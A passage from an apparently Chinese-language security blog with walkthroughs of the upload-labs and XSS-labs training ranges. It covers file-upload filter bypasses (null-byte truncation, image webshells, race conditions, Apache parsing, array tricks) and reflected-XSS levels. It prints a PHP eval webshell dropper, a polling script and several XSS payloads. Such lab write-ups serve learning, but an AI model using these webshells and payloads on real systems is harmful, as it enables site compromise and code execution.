class="headerlink" title="Pass-12"></a>Pass-12</h3><p>看下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">strrpos</span>(<span class="keyword">string</span>,find,start) 函数查找字符串在另一字符串中最后一次出 现的位置（区分大小写）。</span><br><span class="line"><span class="title function_ invoke__">substr</span>(<span class="keyword">string</span>,start,length) 函数返回字符串的一部分*(从start开始 ，长度为 length)</span><br></pre></td></tr></table></figure><p>源码中对后缀进行白名单检测，只允许 jpg ，png，gif</p><p>首先我们上传的是一个php文件，首先要抓包更改它的后缀名来绕过白名单验证</p><p>但最终文件的存放位置是以拼接的方式，可以使用%00截断</p><ol><li>上传shell.jpg的一句话木马</li><li>save_path&#x3D;..&#x2F;upload&#x2F;shell.php%00</li><li>成功上传后，%00后的不会被识别</li></ol><p><img src="https://pic4.zhimg.com/v2-6e7c88a0a5df47cd8face3d4c667ff7f_r.jpg" alt="1"></p><p>原理：php的一些函数的底层是C语言，而move_uploaded_file就是其中之一，遇到0x00会截断，0x表示16进制，URL中%00解码成16进制就是0x00。</p><h3 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h3><h3 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h3><p>这一关会读取判断上传文件的前两个字节，判断上传文件类型，并且后端会根据判断得到的文件类型重命名上传文件<br>使用</p><p>且题目提示存在文件包含漏洞,那么我们可以使用 图片马 + 文件包含 绕过</p><p>上传图片马后利用文件包含构造url,使用蚁剑连接</p><p>(一句话木马前写两个占位符好改一些)</p><h3 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h3><p>通过使用getimagesize()检查是否为图片文件,所以与上题方法一样</p><h3 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h3><p>exif_imagetype()读取一个图像的第一个字节并检查其后缀名。<br>返回值与getimage()函数返回的索引2相同，但是速度比getimage快得多。需要开启php_exif模块。</p><p>所以与上题做法一致</p><h3 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h3><p>这一关对上传图片进行了判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif图片，最后再做了一次二次渲染，但是后端二次渲染需要找到渲染后的图片里面没有发生变化的Hex地方，添加一句话，通过文件包含漏洞执行一句话，使用蚁剑进行连接</p><p>对于做文件上传之二次渲染建议用GIF图片，相对于简单一点</p><p>上传正常的GIF图片下载回显的图片，用010Editor编辑器进行对比两个GIF图片内容，找到相同的地方（指的是上传前和上传后，两张图片的部分Hex仍然保持不变的位置）并插入PHP一句话木马，上传带有PHP一句话木马的GIF图片</p><hr><p>注意:二次渲染不会渲染已经被渲染过的文件,我们可以将第一次渲染后的图片写入一句话木马再进行上传就不会被渲染</p><h3 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h3><p>题目提示需要代码审计,那我们来看下部分源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file_name</span>,<span class="title function_ invoke__">strrpos</span>(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从源码来看，服务器先是将上传的文件保存下来，然后将文件的后缀名同白名单对比，如果是jpg、png、gif中的一种，就将文件进行重命名。如果不符合的话，unlink()函数就会删除该文件。</p><p>也就是说上传的非法文件会被删除,但又没有文件包含漏洞所以图片马又不好使,所以我们可以分析一下</p><p>代码运行分析到我们文件是非法的并且删除的过程是有时间的,那么我们就可以在文件还没有被删除的某一瞬间访问到,但是这个过程通过人工是不可能的</p><p>那么我们可以对服务器一直发送非法文件并且同时不停的访问这个文件,而这也称为条件竞争,顾名思义就是和删除文件的函数竞争这个非法文件</p><p>而这个过程可以通过bp的intruder模块多线程发包,同时用bp不停访问或者写python脚本实现这个功能</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://xxx.xxx.xxx.xxx/upload-labs/upload/shell.php&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> html.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>注意:在这个过程中,即使访问到我们上传的php文件也无法用蚁剑连接到,毕竟访问到后文件依旧被删除,所以我们考虑写一个这样的php文件上传</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[&quot;ytm666&quot;])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>而这段代码的大致意思就是访问到后能在目录下写入一个这样的一句话木马,之后我们连接写入后的文件shell.php就好了</p><h3 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h3><p>依旧先分析下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;./myupload.php&quot;</span>);</span><br><span class="line">    <span class="variable">$imgFileName</span> =<span class="title function_ invoke__">time</span>();</span><br><span class="line">    <span class="variable">$u</span> = <span class="keyword">new</span> <span class="title class_">MyUpload</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>],<span class="variable">$imgFileName</span>);</span><br><span class="line">    <span class="variable">$status_code</span> = <span class="variable">$u</span>-&gt;<span class="title function_ invoke__">upload</span>(UPLOAD_PATH);</span><br><span class="line">&#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"> <span class="variable">$dir</span> </span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isUploadedFile</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setDir</span>( <span class="variable">$dir</span> );</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkExtension</span>();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkSize</span>();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if flag to check if the file exists is set to 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable language_">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</span><br><span class="line">      </span><br><span class="line">      <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkFileExists</span>();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we are here, we are ready to move the file to destination</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">move</span>();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable language_">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">renameFile</span>();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="string">&quot;SUCCESS&quot;</span> );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>发现与上题大体类似,但本题从源码来看的话，服务器先是将文件后缀跟白名单做了对比，然后检查了文件大小以及文件是否已经存在。文件上传之后又对其进行了重命名。</p><p>那么我们可以利用apache解析漏洞,将.php后缀后面再加上一个.7z后缀,这样后台把.7z当作后缀不会删除,但是apache服务器解析不了.7z文件就会继续向前解析.php文件</p><p>所以我们需要做的是在文件名被改之前,访问到这个文件,那么做法和上题大体相同</p><h3 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h3><p>比较简单,利用之前的几种后缀绕过方法都能绕过</p><h3 id="Pass-21"><a href="#Pass-21" class="headerlink" title="Pass-21"></a>Pass-21</h3><p>先进行代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">这一关白名单</span><br><span class="line">验证过程：</span><br><span class="line">--&gt; 验证上传路径是否存在</span><br><span class="line">--&gt; 验证[&#x27;upload_file&#x27;]的content-type是否合法（可以抓包修改）</span><br><span class="line">--&gt; 判断POST参数是否为空定义$file变量（关键：构造数组绕过下一步的判断）</span><br><span class="line">--&gt;判断file不是数组则使用explode(&#x27;.&#x27;, strtolower($file))对file进行切割，将file变为一个数组</span><br><span class="line">--&gt; 判断数组最后一个元素是否合法</span><br><span class="line">--&gt; 数组第一位和$file[count($file) - 1]进行拼接，产生保存文件名file_name</span><br><span class="line">--&gt; 上传文件</span><br></pre></td></tr></table></figure><p>这道题重点就是让分割后的最后一个数组符合要求,并且让首个数组和$file[count($file) - 1]部分拼接</p><p>那么我们的思路就是传多个数组,让数组末尾符合要求,并且首位拼接后符合php后缀</p><p>这样我们可以传一个下表大于一的数组作为最后一位数组,例如$file[5]&#x3D;jpg绕过白名单</p><p>并且前两位数组可以传为$file[0]&#x3D;shell.php,$file[1]&#x3D;php</p><p>这样我们只传了三个有效数组,$file[count($file) - 1]这部分结果就为$file[2]</p><p>但是因为我们file[2]实际上是没有值的,这样和第一位数组拼接就成为了shell.php.</p><p>这样就成功的绕过并上传后门了</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS-labs</title>
      <link href="/2023/10/19/%E9%9D%B6%E5%9C%BA-2023-10-19-XSS-labs/"/>
      <url>/2023/10/19/%E9%9D%B6%E5%9C%BA-2023-10-19-XSS-labs/</url>
      
        <content type="html"><![CDATA[<h2 id="XSS靶场"><a href="#XSS靶场" class="headerlink" title="XSS靶场"></a>XSS靶场</h2><p>我用的是线上XSS-labs:<br><a href="https://xssaq.com/yx/">https://xssaq.com/yx/</a></p><p>一些知识点详见周记2的XSS部分:<br><a href="https://yantm666.github.io/2023/10/15/%E5%91%A8%E8%AE%B0-2023-10-15-%E5%91%A8%E8%AE%B02/">https://yantm666.github.io/2023/10/15/%E5%91%A8%E8%AE%B0-2023-10-15-%E5%91%A8%E8%AE%B02/</a></p><h3 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h3><p>查看网站源码，可以发现get传参name的值test插入了html里头，还回显了payload的长度</p><p>直接get传js代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert()<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h3><p>第一个test可以跟上次一样直接插入js即可，我们先试试看</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;1&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>没成功，看一下源码</p><p><img src="https://img-blog.csdnimg.cn/bf7314876c0543c1ad3e7e7da77fb55e.png" alt="1"></p><p>第一个test进行了html实体转义，但是第二个没有，我们只需要闭合掉前面的input和引号即可，构造payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;1&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  &lt;&quot;</span><br></pre></td></tr></table></figure><p>或者末尾通过注释使其失效也可以</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;1&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> //</span><br></pre></td></tr></table></figure><h3 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h3><p>经过尝试发现符号都被实体化了,并看源码发现用的是htmlspecialchars() 函数</p><p>那我们先讲讲htmlspecialchars</p><p>使用htmlspecialchars函数把预定义的字符&amp;、”、 ’、&lt;、&gt;转换为HTML实体，防止浏览器将其作为HTML元素</p><p>但是默认是只编码双引号的，而且单引号无论如何都不转义。</p><hr><p>那么我们可以通过单引号闭合前面的双引号但无法用尖括号闭合input标签</p><p>这样的话我们可以考虑html事件通过某种触发输入框时执行代码</p><p>比如我们可以选择比较常用的一种事件,payload如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;onclick=&#x27;</span><span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;keyword&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#x27;onclick=&#x27;alert(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>不难发现,payload注入在其中后,第一个单引号把value后面的双引号闭合.第二个单引号与最后的双引号将js代码包裹其中</p><p>这样注入之后通过点击输入框来执行js代码</p><h3 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h3><p>与上题同理,只不过多了些过滤,直接上payload</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;onclick=&quot;</span><span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h3><p>经过尝试本题的双引号和尖括号等没有被实体化,但是过滤了on这类常用的事件,那么基本上就要考虑其他方法来执行js代码了</p><p>我们可以选择使用超链接,利用js伪协议执行js代码(周记2有写到)</p><p>那么我们只需要闭合input标签和无关紧要的双引号(超链接之后的没必要闭合因为不印象超链接的生成)就可以成功注入这段超链接了,payload如下:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt; &lt;a href=&quot;</span><span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="string">&#x27;1&#x27;</span>)<span class="string">&quot;&gt;link&lt;/a&gt;</span></span><br></pre></td></tr></table></figure><h3 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 